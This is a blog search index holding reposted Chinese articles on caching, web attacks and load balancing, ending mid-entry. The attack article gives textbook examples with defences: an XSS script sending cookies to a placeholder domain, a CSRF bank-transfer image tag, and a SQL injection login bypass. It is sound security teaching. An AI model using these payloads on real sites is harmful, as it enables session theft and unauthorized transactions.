<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>缓存</title>
    <link href="/2023/03/12/%E7%BC%93%E5%AD%98/"/>
    <url>/2023/03/12/%E7%BC%93%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<h1 id="一、缓存特征"><a href="#一、缓存特征" class="headerlink" title="一、缓存特征"></a>一、缓存特征</h1><h2 id="命中率"><a href="#命中率" class="headerlink" title="命中率"></a>命中率</h2><p>当某个请求能够通过访问缓存而得到响应时，称为缓存命中。</p><p>缓存命中率越高，缓存的利用率也就越高。</p><h2 id="最大空间"><a href="#最大空间" class="headerlink" title="最大空间"></a>最大空间</h2><p>缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。</p><p>当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。</p><h2 id="淘汰策略"><a href="#淘汰策略" class="headerlink" title="淘汰策略"></a>淘汰策略</h2><ul><li><p>FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。</p></li><li><p>LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。</p></li><li><p>LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。</p></li></ul><h1 id="二、缓存位置"><a href="#二、缓存位置" class="headerlink" title="二、缓存位置"></a>二、缓存位置</h1><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。</p><h2 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h2><p>网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。</p><h2 id="本地缓存"><a href="#本地缓存" class="headerlink" title="本地缓存"></a>本地缓存</h2><p>使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。</p><h2 id="分布式缓存"><a href="#分布式缓存" class="headerlink" title="分布式缓存"></a>分布式缓存</h2><p>使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。</p><p>相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。</p><h2 id="数据库缓存"><a href="#数据库缓存" class="headerlink" title="数据库缓存"></a>数据库缓存</h2><p>MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。</p><h2 id="Java内部的缓存"><a href="#Java内部的缓存" class="headerlink" title="Java内部的缓存"></a>Java内部的缓存</h2><p>Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。</p><h2 id="CPU多级缓存"><a href="#CPU多级缓存" class="headerlink" title="CPU多级缓存"></a>CPU多级缓存</h2><p>CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。</p><h1 id="三、CDN"><a href="#三、CDN" class="headerlink" title="三、CDN"></a>三、CDN</h1><p>内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。</p><p>CDN 主要有以下优点：</p><ul><li>更快地将数据分发给用户；</li><li>通过部署多台服务器，从而提高系统整体的带宽性能；</li><li>多台服务器可以看成是一种冗余机制，从而具有高可用性。</li></ul><center><img src="/2023/03/12/%E7%BC%93%E5%AD%98/%E7%BC%93%E5%AD%98_3_CDN_%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C.png" class="" title="缓存_3_CDN_内容分发网络"></center><h1 id="四、缓存问题"><a href="#四、缓存问题" class="headerlink" title="四、缓存问题"></a>四、缓存问题</h1><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。</p><p>解决方案：</p><ul><li>对这些不存在的数据缓存一个空数据；</li><li>对这类请求进行过滤。</li></ul><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><p>指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。</p><p>在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。</p><p>解决方案：</p><ul><li>为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现；</li><li>为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。</li><li>也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。</li></ul><h2 id="缓存一致性"><a href="#缓存一致性" class="headerlink" title="缓存一致性"></a>缓存一致性</h2><p>缓存一致性要求数据更新的同时缓存数据也能够实时更新。</p><p>解决方案：</p><ul><li>在数据更新的同时立即去更新缓存；</li><li>在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。</li></ul><p>要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。</p><h2 id="缓存“无底洞”现象"><a href="#缓存“无底洞”现象" class="headerlink" title="缓存“无底洞”现象"></a>缓存“无底洞”现象</h2><p>指的是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。</p><p>产生原因：缓存系统通常采用 hash 函数将 key 映射到对应的缓存节点，随着缓存节点数目的增加，键值分布到更多的节点上，导致客户端一次批量操作会涉及多次网络操作，这意味着批量操作的耗时会随着节点数目的增加而不断增大。此外，网络连接数变多，对节点的性能也有一定影响。</p><p>解决方案：</p><ul><li>优化批量数据操作命令；</li><li>减少网络通信次数；</li><li>降低接入成本，使用长连接 &#x2F; 连接池，NIO 等</li></ul><h1 id="五、数据分布"><a href="#五、数据分布" class="headerlink" title="五、数据分布"></a>五、数据分布</h1><h2 id="哈希分布"><a href="#哈希分布" class="headerlink" title="哈希分布"></a>哈希分布</h2><p>哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。</p><p>传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移</p><h2 id="顺序分布"><a href="#顺序分布" class="headerlink" title="顺序分布"></a>顺序分布</h2><p>将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，…，6001 ~ 7000。</p><p>顺序分布相比于哈希分布的主要优点如下：</p><ul><li>能保持数据原有的顺序；</li><li>并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。</li></ul><h1 id="六、一致性哈希"><a href="#六、一致性哈希" class="headerlink" title="六、一致性哈希"></a>六、一致性哈希</h1><p>Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>将哈希空间 $[0, 2^{n}-1]$ 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。</p><center><img src="/2023/03/12/%E7%BC%93%E5%AD%98/%E7%BC%93%E5%AD%98_6_%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C_%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86.png" class="" title="缓存_6_一致性哈希_基本原理"></center><p>一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。</p><center><img src="/2023/03/12/%E7%BC%93%E5%AD%98/%E7%BC%93%E5%AD%98_6_%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C_%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86_2.png" class="" title="缓存_6_一致性哈希_基本原理_2"></center><h2 id="虚拟节点"><a href="#虚拟节点" class="headerlink" title="虚拟节点"></a>虚拟节点</h2><p>上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。</p><p>数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。</p><p>解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。</p><h1 id="七、LRU"><a href="#七、LRU" class="headerlink" title="七、LRU"></a>七、LRU</h1><p>以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：</p><ul><li>访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。</li><li>为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cyc2018.xyz/">https://www.cyc2018.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>系统设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击技术</title>
    <link href="/2023/03/11/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/03/11/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h2><ol><li><strong>设置 Cookie 为 HttpOnly</strong></li></ol><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><ol start="2"><li><strong>过滤特殊字符</strong></li></ol><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-symbol">&amp;lt;</span>form<span class="hljs-symbol">&amp;gt;</span><br>  <span class="hljs-symbol">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="hljs-symbol">&amp;gt;</span><br><span class="hljs-symbol">&amp;lt;</span>/form<span class="hljs-symbol">&amp;gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-symbol">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="hljs-symbol">&amp;gt;</span><br>alert(/xss/);<br><span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName<br></code></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h2><ol><li><strong>检查 Referer 首部字段</strong></li></ol><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><ol start="2"><li><strong>添加校验 Token</strong></li></ol><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><ol start="3"><li><strong>输入验证码</strong></li></ol><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="三、SQL注入攻击"><a href="#三、SQL注入攻击" class="headerlink" title="三、SQL注入攻击"></a>三、SQL注入攻击</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;&quot; <span class="hljs-operator">+</span> userName <span class="hljs-operator">+</span> &quot;&#x27;) and (pw = &#x27;&quot;<span class="hljs-operator">+</span> passWord <span class="hljs-operator">+</span>&quot;&#x27;);&quot;<br></code></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL">userName <span class="hljs-operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;<br>passWord <span class="hljs-operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;<br></code></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;<br></code></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users;&quot;<br></code></pre></td></tr></table></figure><h2 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h2><ol><li><strong>使用参数化查询</strong></li></ol><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);<br>stmt.setString(<span class="hljs-number">1</span>, userid);<br>stmt.setString(<span class="hljs-number">2</span>, password);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery();<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>单引号转换</strong></li></ol><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cyc2018.xyz/">https://www.cyc2018.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>系统设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>集群</title>
    <link href="/2023/03/11/%E9%9B%86%E7%BE%A4/"/>
    <url>/2023/03/11/%E9%9B%86%E7%BE%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="一、负载均衡"><a href="#一、负载均衡" class="headerlink" title="一、负载均衡"></a>一、负载均衡</h1><p>集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。</p><p>负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。</p><p>负载均衡器可以用来实现高可用以及伸缩性：</p><ul><li>高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；</li><li>伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。</li></ul><p>负载均衡器运行过程包含两个部分：</p><ol><li><p>根据负载均衡算法得到转发的节点；</p></li><li><p>进行转发。</p></li></ol><h2 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h2><h3 id="1-轮询"><a href="#1-轮询" class="headerlink" title="1.轮询"></a>1.轮询</h3><p>轮询算法把每个请求轮流发送到每个服务器上。</p><p>下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_1_%E8%BD%AE%E8%AF%A2_1.png" class="" title="负载均衡算法_1_轮询_1"></center><p>该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_1_%E8%BD%AE%E8%AF%A2_2.png" class="" title="负载均衡算法_1_轮询_2"></center><h3 id="2-加权轮询（Weighted-Bound-Robbin）"><a href="#2-加权轮询（Weighted-Bound-Robbin）" class="headerlink" title="2.加权轮询（Weighted Bound Robbin）"></a>2.加权轮询（Weighted Bound Robbin）</h3><p>加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。</p><p>例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_2_%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2_1.png" class="" title="负载均衡算法_2_加权轮询_1"></center><h3 id="3-最少连接（least-Connections）"><a href="#3-最少连接（least-Connections）" class="headerlink" title="3.最少连接（least Connections）"></a>3.最少连接（least Connections）</h3><p>由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。</p><p>例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_3_%E6%9C%80%E5%B0%91%E8%BF%9E%E6%8E%A5_1.png" class="" title="负载均衡算法_3_最少连接_1"></center><p>最少连接算法就是将请求发送给当前最少连接数的服务器上。</p><p>例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_3_%E6%9C%80%E5%B0%91%E8%BF%9E%E6%8E%A5_2.png" class="" title="负载均衡算法_3_最少连接_2"></center><h3 id="4-加权最少连接（Weighted-Least-Connection）"><a href="#4-加权最少连接（Weighted-Least-Connection）" class="headerlink" title="4.加权最少连接（Weighted Least Connection）"></a>4.加权最少连接（Weighted Least Connection）</h3><p>在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。</p><h3 id="5-随机算法（Random）"><a href="#5-随机算法（Random）" class="headerlink" title="5.随机算法（Random）"></a>5.随机算法（Random）</h3><p>把请求随机发送到服务器上。</p><p>和轮询算法类似，该算法比较适合服务器性能差不多的场景。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_5_%E9%9A%8F%E6%9C%BA%E7%AE%97%E6%B3%95_1.png" class="" title="负载均衡算法_5_随机算法_1"></center><h3 id="6-源地址哈希法（IP-Hash）"><a href="#6-源地址哈希法（IP-Hash）" class="headerlink" title="6.源地址哈希法（IP Hash）"></a>6.源地址哈希法（IP Hash）</h3><p>源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。</p><p>可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）</p><center><img 